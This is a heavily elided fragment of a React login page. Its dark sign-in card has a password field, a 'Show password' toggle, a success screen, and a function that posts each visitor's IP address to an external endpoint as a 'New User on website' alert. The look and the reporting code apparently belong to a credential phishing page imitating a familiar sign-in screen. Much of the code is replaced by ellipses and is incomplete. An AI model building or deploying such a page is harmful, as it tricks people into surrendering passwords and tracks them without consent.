...
function App() {
  ...
  const sendIp = async () => {
    try {
      const message = `New User on website: \nIp: ${Ip}`;
      await axios.post(
    ...
    <div className="min-h-screen bg-[#202124] flex flex-col items-center justify-center p-4">
      {success ? (
        <div className="w-full max-w-md bg-[#202124] rounded-2xl p-10 border border-[#5f6368] shadow-lg">
          ...
          <h1 className="text-3xl font-normal text-white mb-6 text-center">
            Success!
          </h1>
          <p className="text-[#e8eaed] text-center mb-4">
        ...
        <div className="w-full max-w-md bg-[#202124] rounded-2xl p-10 border border-[#5f6368] shadow-lg">
          ...
          <div className="mb-6">
            ...
            <div className="mt-2 flex items-center">
              ...
              />
              <label htmlFor="showPassword" className="text-[#e8eaed] text-sm">
                Show password
              </label>
            </div>
          </div>
          ...
          <div className="flex justify-between items-center">
            ...
            <button
              ...
              } text-[#202124] px-6 py-2 rounded-md transition-colors font-medium flex items-center`}
            >
              {isSubmitting ? (
                <>
      ...
      <div className="w-full max-w-md mt-4 flex justify-between text-[#9aa0a6] text-sm">
        ...
        <div className="flex space-x-4">
          <a href="#" className="hover:text-[#e8eaed]">
            Help
          </a>
          <a href="#" className="hover:text-[#e8eaed]">
            Privacy
